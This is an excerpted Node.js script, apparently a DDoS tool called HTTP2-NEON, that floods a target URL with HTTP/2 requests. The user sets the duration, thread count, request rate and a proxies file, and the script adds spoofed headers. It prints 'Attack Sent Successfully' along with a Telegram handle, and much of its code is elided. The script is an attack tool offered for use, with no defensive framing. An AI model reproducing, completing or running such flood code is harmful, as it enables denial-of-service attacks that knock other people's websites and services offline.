...
const requestsPerSecond = parseInt(process.argv[5]);
...
const headers = {
  ...
  'x-custom-header': 'Spoofed Header'
};

if (!url || !time || !thread || !requestsPerSecond || !proxiesFile) {
  console.error('Please provide all the required command line arguments:');
  console.error(`Example: node HTTP2-NEON.js <url> <time> <thread> <rate> <proxies file>`.rainbow);
  process.exit(1);
}
...
const flood = async () => {
  ...
  const client = http2.connect(`${protocol}//${hostname}`);
  ...
  setInterval(sendRequest, 1000 / requestsPerSecond);
};
...
setTimeout(() => {
  console.log("Flood Attacking Finished   -   t.me/xNeonn".bgGreen);
  process.exit(0);
}, time * 1000);

console.log("Attack Sent Successfully   -   t.me/xNeonn".bgRed);